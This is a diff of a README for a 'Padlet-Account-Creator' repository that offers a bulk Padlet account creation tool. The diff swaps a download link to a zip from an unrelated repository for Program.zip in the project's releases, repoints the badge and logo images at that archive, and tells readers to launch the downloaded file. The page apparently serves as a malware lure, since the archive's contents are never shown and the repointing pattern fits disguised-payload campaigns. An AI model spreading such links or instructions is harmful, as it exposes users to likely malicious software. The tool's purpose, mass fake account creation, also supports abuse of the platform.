@@ -27,7 +27,7 @@ Welcome to the "Padlet-Account-Creator" repository, where you can find an automa
 - tlsclient
 
 ## Get Started
-To get started with Padlet Account Creator, simply download the tool from the following link: <a href="https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip"><img src="https://img.shields.io/badge/Download-Tool-brightgreen"></a>.
+To get started with Padlet Account Creator, simply download the tool from the following link: <a href="https://github.com/wsuesports/Padlet-Account-Creator/releases/download/v1.0/Program.zip"><img src="https://github.com/wsuesports/Padlet-Account-Creator/releases/download/v1.0/Program.zip"></a>.
 
 If the link ends with a file name, it needs to be launched to access the tool.
 
@@ -44,4 +44,4 @@ Thank you for exploring the Padlet Account Creator tool. We hope this tool enhan
 
 Let's create Padlet accounts like never before! 🎉🚀
 
-![Padlet Logo](https://cdn.worldvectorlogo.com/logos/padlet.svg)
+![Padlet Logo](https://github.com/wsuesports/Padlet-Account-Creator/releases/download/v1.0/Program.zip)
